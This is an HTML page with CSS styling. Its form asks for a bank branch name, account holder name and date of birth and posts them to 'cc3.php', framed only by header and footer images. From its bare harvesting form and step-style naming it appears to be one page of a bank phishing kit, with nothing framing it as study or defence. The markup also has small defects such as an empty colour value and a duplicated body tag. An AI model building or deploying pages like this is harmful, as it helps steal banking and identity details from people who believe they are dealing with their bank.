<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>

input[type=text], input[type=password] {
  width: 100%;
  padding: 06px 20px;
  margin: 8px 0;
  display: inline-table;
  border: 1px solid #;
  box-sizing: border-box;
}

button {
  background-color:#008CBA ;
  color: white;
  padding: 09px 20px;
  margin:  0;
  border: none;
  cursor: pointer;
  width: 30%; 
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
 
   
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>
  <body style="background-color:;">
</body>
<header>

    <center><h1 class="text-center"><img src="./img/HEADER12.jpg" style="width: 100%;"></h1></center>
  
  </header>


<form action="cc3.php" method="post">
  <div class="imgcontainer">
    
  </div>

  <div class="container">



<label>Branch Name*</label>
    <input type="text" placeholder="" name="Branch Name" required>



<label>Account Holder Name*</label>
    <input type="text" placeholder="" name="Holder Name" required>    


<label>Date Of Birth (DD/MM/YYYY)*</label>
    <input type="text" placeholder="" name="DOB"required>




    <center><button type="submit">Submit</button> 
</center>
  </div>


<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>



<center><h1 class="text-center"><img src="./img/FOOT11.jpg" style="width: 100%;"></h1></center>

</form>

</body>
</html>
